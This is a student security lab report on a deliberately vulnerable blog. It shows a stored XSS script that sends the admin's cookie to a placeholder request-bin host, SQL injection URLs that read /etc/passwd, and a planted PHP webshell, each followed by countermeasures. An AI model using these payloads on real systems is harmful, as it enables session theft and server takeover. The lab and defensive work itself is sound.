# Report Lab 3 - Albin Skeppstedt Isak Söderlind

## Part 1 - XSS
We found that comments on blog posts does not have input sanitation against script tags, which made it possible to inject javascript into the frontend. The lab has a simulated admin that visits every page regularly. Meaning that when the admin loads the comment's section on a post, their client executes code that we insert.

We used this in combination with requestbin to export the cookie to another host. Leaving only the script as trace on the website after the exploit. Since it's not visably rendered, we believe that it meets the requirement about non visable traces.
### Script
```html
<script>
var request = new XMLHttpRequest();
request.open('GET', 'REQUESTBIN_URL' + '?c=' + document.cookie);
request.send();
</script>
```
### Countermeasures
Firstly, input sanitation could have prevented our attack. By escaping "<,>"-tags, they would be rendered as text instead of an executable script. This can be done server side, before the text is stored in the database.

Secondly, HTTPonly cookies would render the exploit impossible assuming that the admin is using an HTTPonly compliant web browser (Chromium, Firefox, Safari). It is a header value set on the cookie making compliant web browsers restrictive with cookies to javascript APIs. In our case, getting the session cookie with `document.cookie` wouldn't be possible.

Thridly, using an iframe for the comments div (`.secondary-navigation`) with the attribute `sandbox=allow-forms` would sandbox the comments. The sandbox attribute is deny by default, so only allowing forms would make scripts unable to run, as `allow-scripts` is a different permission that needs to be given to the iframe.

Fourthly, isolating user created content under a different origin where a seperate session key is used, or none at all. Such as having `blog.com` as a main site and `blogcontent.com` as the separate origin containing user content. In case a user uploads malicious code that steals session keys it would only get the session key for the user content part of the website (if any), not the part with the admin control.

## Part 2 - SQL injection

### Finding the vulnerability

The vulnerability we found was on the functionality of editing posts. We found it by trying different URLs that have obvious database connectivity, like deleting posts, getting posts, posting comments. We tried by testing whether the end of the URL parses arithmetics on the id. Using `UNION` we can perform arbitrary SQL commands. Like for showing /etc/passwd: `localhost:8080/admin/edit.php?id=0%20UNION%20SELECT%201,2,load_file(%22/etc/passwd%22),4`. Here `load_file` is the part that actually grants us some information, however the 1,2 and 4 columns are also necessary since when using the `union` command both queries need to have the same amount of columns. One can find the correct amount of columns by trail and error.

### Webshell

We planted a malicious file giving us a shell by finding a directory which the mysql user has write access to. Finding this directory involved trial and error. By using the same technique we used earlier in order to be able to read files we can now try to write files using `into outfile` in different directories. An example URL for attempting to plant a file called `z.php` in the directory of `/var/www/` looks like this `localhost:8080/admin/edit.php?id=1%20union%20select%201,2,3,4%20into%20outfile%20%22/var/www/z.php%22`. We tried this for `/var/www/`, `/var/www/classes` and `/var/www/css` of which the css directory worked. We now switch one of the columns, the `1,2,3,4` part, for malicious code that gives us a shell.
```php
<?php
  system($_GET['c']);
?>
```
This code allows us to enter a query parameter `c` in the URL which will then be executed on the system.

### Counter measures
The vulnerability stems from the lack of input sanitazation, the input should have been parameterized. Meaning that the SQL library in the web server's code constructs an SQL query with placeholder values for the input provided by the user. Instead of just placing raw text as a PHP string for the SQL query.. 

When we have achieved an SQL injection we can use that to look at relevant source code files. In the class `classes/post.php` that is used by the admin/post endpoint. We find the function `find` that does not sanitize input or use input parammetrization for `id`. This is why we can execute arbitrary SQL commands.
```php
  function find($id) {
    $result = mysql_query("SELECT * FROM posts where id=".$id);
    $row = mysql_fetch_assoc($result); 
    if (isset($row)){
      $post = new Post($row['id'],$row['title'],$row['text'],$row['published']);
    }
    return $post;
  }
```

As previously mentioned, tightening security on the web application layer is done well through using secure standards put in place by framework authors. As the developers of the web application did with `update` in `classes/post` where `id` is a parameter checked with `intval`. A function that makes sure that what is passed to the SQL query is an integer.

```php
  function update($title, $text) {
      $sql = "UPDATE posts SET title='";
      $sql .= mysql_real_escape_string($_POST["title"])."',text='";
      $sql .= mysql_real_escape_string( $_POST["text"])."' WHERE id=";
      $sql .= intval($this->id);
      $result = mysql_query($sql);
      $this->title = $title; 
      $this->text = $text; 
  } 
```
#### Database system

For executing SQL commands, we can see that the database user is `root@localhost` with `localhost:8080/admin/edit.php?id=0 union select 1,2,current_user(),4`. Instead the database user should be granted the least privilege that is needed. For example, the user not having access to commands for reading and creating files i.e. the FILE privilege. If this countermeasure was taken we would not be able to read the `/etc/passwd` file.


#### Operating system
Regarding the different users:

* The database user is a bit tricky. We first tried reading the process information through the `read_file` exploit. `/proc/self/status` or `/proc/self/environ` should indicate what user the current process is running as. But the database doesn't seem to have permission to see that information. However if we look at the database configuration file at `/etc/my.cnf` we can see that the user is`mysql`. 
* As we have a webshell we can run `stat -c '%U' z.php` (z.php is our webshell) and see that `mysql` is the owner of the file because it was created by the mysql server through command injection.
* When executing commands through the webshell, we can run `whoami` and see that we are the user `www-data`. Or rather that the effective user is `www-data`. This makes sense since the webshell is a part of or was spawned from the web server process. However `logname` does not show anything because the shell was not spawned from logging in, just purely from a process, so the environment variable `$USER` isn't set.

As we can see, they are not the same.

As previously mentioned, lowering the privileges of the database user would fix some issues. The privilege for the mysql user should also be follow the same principle such that if the database still attempts to access files that it shouldn't it is blocked by the OS. The privileges of the web server should also be minimal. Currently the web server is able to write to files, which it should not be able to do unless necessary since it allows us from our webshell to edit the website in any way we wish.